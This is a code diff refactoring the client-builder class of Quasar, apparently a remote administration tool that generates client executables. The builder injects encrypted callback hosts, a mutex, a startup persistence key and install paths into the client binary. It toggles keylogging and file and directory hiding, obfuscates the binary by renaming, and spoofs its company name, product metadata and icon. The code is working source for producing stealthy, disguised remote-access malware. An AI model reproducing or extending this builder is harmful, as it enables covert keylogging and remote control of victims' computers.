@@ -2,8 +2,8 @@
 using Mono.Cecil.Cil;
 using Quasar.Common.Cryptography;
 using Quasar.Common.Helpers;
-using Quasar.Server.Data;
 using System;
+using Quasar.Server.Models;
 using Vestris.ResourceLib;
 
 namespace Quasar.Server.Build
@@ -11,22 +11,75 @@ namespace Quasar.Server.Build
     /// <summary>
     /// Provides methods used to create a custom client executable.
     /// </summary>
-    public static class ClientBuilder
+    public class ClientBuilder
     {
+        private readonly BuildOptions _options;
+        private readonly string _clientFilePath;
+
+        public ClientBuilder(BuildOptions options, string clientFilePath)
+        {
+            _options = options;
+            _clientFilePath = clientFilePath;
+        }
+
         /// <summary>
         /// Builds a client executable.
         /// </summary>
-        /// <remarks>
-        /// Assumes the 'client.bin' file exist.
-        /// </remarks>
-        public static void Build(BuildOptions options)
+        public void Build()
         {
-            // PHASE 1 - Settings
-            var keys = Aes128.DeriveKeys(options.Password);
-            var key = Convert.ToBase64String(keys.Item1);
-            var authKey = Convert.ToBase64String(keys.Item2);
+            using (AssemblyDefinition asmDef = AssemblyDefinition.ReadAssembly(_clientFilePath))
+            {
+                // PHASE 1 - Writing settings
+                WriteSettings(asmDef);
 
-            AssemblyDefinition asmDef = AssemblyDefinition.ReadAssembly("client.bin");
+                // PHASE 2 - Renaming
+                Renamer r = new Renamer(asmDef);
+
+                if (!r.Perform())
+                    throw new Exception("renaming failed");
+
+                // PHASE 3 - Saving
+                r.AsmDef.Write(_options.OutputPath);
+            }
+
+            // PHASE 4 - Assembly Information changing
+            if (_options.AssemblyInformation != null)
+            {
+                VersionResource versionResource = new VersionResource();
+                versionResource.LoadFrom(_options.OutputPath);
+
+                versionResource.FileVersion = _options.AssemblyInformation[7];
+                versionResource.ProductVersion = _options.AssemblyInformation[6];
+                versionResource.Language = 0;
+
+                StringFileInfo stringFileInfo = (StringFileInfo) versionResource["StringFileInfo"];
+                stringFileInfo["CompanyName"] = _options.AssemblyInformation[2];
+                stringFileInfo["FileDescription"] = _options.AssemblyInformation[1];
+                stringFileInfo["ProductName"] = _options.AssemblyInformation[0];
+                stringFileInfo["LegalCopyright"] = _options.AssemblyInformation[3];
+                stringFileInfo["LegalTrademarks"] = _options.AssemblyInformation[4];
+                stringFileInfo["ProductVersion"] = versionResource.ProductVersion;
+                stringFileInfo["FileVersion"] = versionResource.FileVersion;
+                stringFileInfo["Assembly Version"] = versionResource.ProductVersion;
+                stringFileInfo["InternalName"] = _options.AssemblyInformation[5];
+                stringFileInfo["OriginalFilename"] = _options.AssemblyInformation[5];
+
+                versionResource.SaveTo(_options.OutputPath);
+            }
+
+            // PHASE 5 - Icon changing
+            if (!string.IsNullOrEmpty(_options.IconPath))
+            {
+                IconFile iconFile = new IconFile(_options.IconPath);
+                IconDirectoryResource iconDirectoryResource = new IconDirectoryResource(iconFile);
+                iconDirectoryResource.SaveTo(_options.OutputPath);
+            }
+        }
+
+        private void WriteSettings(AssemblyDefinition asmDef)
+        {
+            var key = StringHelper.GetRandomString(32);
+            var aes = new Aes256(key);
 
             foreach (var typeDef in asmDef.Modules[0].Types)
             {
@@ -36,133 +89,83 @@ namespace Quasar.Server.Build
                     {
                         if (methodDef.Name == ".cctor")
                         {
-                            string encKey = StringHelper.GetRandomString(20);
-
                             int strings = 1, bools = 1;
 
                             for (int i = 0; i < methodDef.Body.Instructions.Count; i++)
                             {
-                                if (methodDef.Body.Instructions[i].OpCode.Name == "ldstr") // string
+                                if (methodDef.Body.Instructions[i].OpCode == OpCodes.Ldstr) // string
                                 {
                                     switch (strings)
                                     {
                                         case 1: //version
-                                            methodDef.Body.Instructions[i].Operand = Aes128.Encrypt(options.Version, encKey);
+                                            methodDef.Body.Instructions[i].Operand = aes.Encrypt(_options.Version);
                                             break;
                                         case 2: //ip/hostname
-                                            methodDef.Body.Instructions[i].Operand = Aes128.Encrypt(options.RawHosts, encKey);
+                                            methodDef.Body.Instructions[i].Operand = aes.Encrypt(_options.RawHosts);
                                             break;
-                                        case 3: //key
+                                        case 3: //installsub
+                                            methodDef.Body.Instructions[i].Operand = aes.Encrypt(_options.InstallSub);
+                                            break;
+                                        case 4: //installname
+                                            methodDef.Body.Instructions[i].Operand = aes.Encrypt(_options.InstallName);
+                                            break;
+                                        case 5: //mutex
+                                            methodDef.Body.Instructions[i].Operand = aes.Encrypt(_options.Mutex);
+                                            break;
+                                        case 6: //startupkey
+                                            methodDef.Body.Instructions[i].Operand = aes.Encrypt(_options.StartupName);
+                                            break;
+                                        case 7: //encryption key
                                             methodDef.Body.Instructions[i].Operand = key;
                                             break;
-                                        case 4: //authkey
-                                            methodDef.Body.Instructions[i].Operand = authKey;
+                                        case 8: //tag
+                                            methodDef.Body.Instructions[i].Operand = aes.Encrypt(_options.Tag);
                                             break;
-                                        case 5: //installsub
-                                            methodDef.Body.Instructions[i].Operand = Aes128.Encrypt(options.InstallSub, encKey);
-                                            break;
-                                        case 6: //installname
-                                            methodDef.Body.Instructions[i].Operand = Aes128.Encrypt(options.InstallName, encKey);
-                                            break;
-                                        case 7: //mutex
-                                            methodDef.Body.Instructions[i].Operand = Aes128.Encrypt(options.Mutex, encKey);
-                                            break;
-                                        case 8: //startupkey
-                                            methodDef.Body.Instructions[i].Operand = Aes128.Encrypt(options.StartupName, encKey);
-                                            break;
-                                        case 9: //encryption key
-                                            methodDef.Body.Instructions[i].Operand = encKey;
-                                            break;
-                                        case 10: //tag
-                                            methodDef.Body.Instructions[i].Operand = Aes128.Encrypt(options.Tag, encKey);
-                                            break;
-                                        case 11: //LogDirectoryName
-                                            methodDef.Body.Instructions[i].Operand = Aes128.Encrypt(options.LogDirectoryName, encKey);
+                                        case 9: //LogDirectoryName
+                                            methodDef.Body.Instructions[i].Operand = aes.Encrypt(_options.LogDirectoryName);
                                             break;
                                     }
                                     strings++;
                                 }
-                                else if (methodDef.Body.Instructions[i].OpCode.Name == "ldc.i4.1" ||
-                                         methodDef.Body.Instructions[i].OpCode.Name == "ldc.i4.0") // bool
+                                else if (methodDef.Body.Instructions[i].OpCode == OpCodes.Ldc_I4_1 ||
+                                         methodDef.Body.Instructions[i].OpCode == OpCodes.Ldc_I4_0) // bool
                                 {
                                     switch (bools)
                                     {
                                         case 1: //install
-                                            methodDef.Body.Instructions[i] = Instruction.Create(BoolOpcode(options.Install));
+                                            methodDef.Body.Instructions[i] = Instruction.Create(BoolOpCode(_options.Install));
                                             break;
                                         case 2: //startup
-                                            methodDef.Body.Instructions[i] = Instruction.Create(BoolOpcode(options.Startup));
+                                            methodDef.Body.Instructions[i] = Instruction.Create(BoolOpCode(_options.Startup));
                                             break;
                                         case 3: //hidefile
-                                            methodDef.Body.Instructions[i] = Instruction.Create(BoolOpcode(options.HideFile));
+                                            methodDef.Body.Instructions[i] = Instruction.Create(BoolOpCode(_options.HideFile));
                                             break;
                                         case 4: //Keylogger
-                                            methodDef.Body.Instructions[i] = Instruction.Create(BoolOpcode(options.Keylogger));
+                                            methodDef.Body.Instructions[i] = Instruction.Create(BoolOpCode(_options.Keylogger));
                                             break;
                                         case 5: //HideLogDirectory
-                                            methodDef.Body.Instructions[i] = Instruction.Create(BoolOpcode(options.HideLogDirectory));
+                                            methodDef.Body.Instructions[i] = Instruction.Create(BoolOpCode(_options.HideLogDirectory));
                                             break;
                                         case 6: // HideInstallSubdirectory
-                                            methodDef.Body.Instructions[i] = Instruction.Create(BoolOpcode(options.HideInstallSubdirectory));
+                                            methodDef.Body.Instructions[i] = Instruction.Create(BoolOpCode(_options.HideInstallSubdirectory));
                                             break;
                                     }
                                     bools++;
                                 }
-                                else if (methodDef.Body.Instructions[i].OpCode.Name == "ldc.i4") // int
+                                else if (methodDef.Body.Instructions[i].OpCode == OpCodes.Ldc_I4) // int
                                 {
                                     //reconnectdelay
-                                    methodDef.Body.Instructions[i].Operand = options.Delay;
+                                    methodDef.Body.Instructions[i].Operand = _options.Delay;
                                 }
-                                else if (methodDef.Body.Instructions[i].OpCode.Name == "ldc.i4.s") // sbyte
+                                else if (methodDef.Body.Instructions[i].OpCode == OpCodes.Ldc_I4_S) // sbyte
                                 {
-                                    methodDef.Body.Instructions[i].Operand = GetSpecialFolder(options.InstallPath);
+                                    methodDef.Body.Instructions[i].Operand = GetSpecialFolder(_options.InstallPath);
                                 }
                             }
                         }
                     }
                 }
-            }
-
-            // PHASE 2 - Renaming
-            Renamer r = new Renamer(asmDef);
-
-            if (!r.Perform())
-                throw new Exception("renaming failed");
-
-            // PHASE 3 - Saving
-            r.AsmDef.Write(options.OutputPath);
-
-            // PHASE 4 - Assembly Information changing
-            if (options.AssemblyInformation != null)
-            {
-                VersionResource versionResource = new VersionResource();
-                versionResource.LoadFrom(options.OutputPath);
-
-                versionResource.FileVersion = options.AssemblyInformation[7];
-                versionResource.ProductVersion = options.AssemblyInformation[6];
-                versionResource.Language = 0;
-
-                StringFileInfo stringFileInfo = (StringFileInfo) versionResource["StringFileInfo"];
-                stringFileInfo["CompanyName"] = options.AssemblyInformation[2];
-                stringFileInfo["FileDescription"] = options.AssemblyInformation[1];
-                stringFileInfo["ProductName"] = options.AssemblyInformation[0];
-                stringFileInfo["LegalCopyright"] = options.AssemblyInformation[3];
-                stringFileInfo["LegalTrademarks"] = options.AssemblyInformation[4];
-                stringFileInfo["ProductVersion"] = versionResource.ProductVersion;
-                stringFileInfo["FileVersion"] = versionResource.FileVersion;
-                stringFileInfo["Assembly Version"] = versionResource.ProductVersion;
-                stringFileInfo["InternalName"] = options.AssemblyInformation[5];
-                stringFileInfo["OriginalFilename"] = options.AssemblyInformation[5];
-
-                versionResource.SaveTo(options.OutputPath);
-            }
-
-            // PHASE 5 - Icon changing
-            if (!string.IsNullOrEmpty(options.IconPath))
-            {
-                IconFile iconFile = new IconFile(options.IconPath);
-                IconDirectoryResource iconDirectoryResource = new IconDirectoryResource(iconFile);
-                iconDirectoryResource.SaveTo(options.OutputPath);
             }
         }
 
@@ -171,7 +174,7 @@ namespace Quasar.Server.Build
         /// </summary>
         /// <param name="p">The value to convert to the OpCode</param>
         /// <returns>Returns the OpCode that represents the value provided.</returns>
-        private static OpCode BoolOpcode(bool p)
+        private OpCode BoolOpCode(bool p)
         {
             return (p) ? OpCodes.Ldc_I4_1 : OpCodes.Ldc_I4_0;
         }
@@ -182,7 +185,7 @@ namespace Quasar.Server.Build
         /// <param name="installpath">The integer value of the install path.</param>
         /// <returns>Returns the signed-byte value of the special folder.</returns>
         /// <exception cref="System.ArgumentException">Thrown if the path to the special folder was invalid.</exception>
-        private static sbyte GetSpecialFolder(int installpath)
+        private sbyte GetSpecialFolder(int installpath)
         {
             switch (installpath)
             {
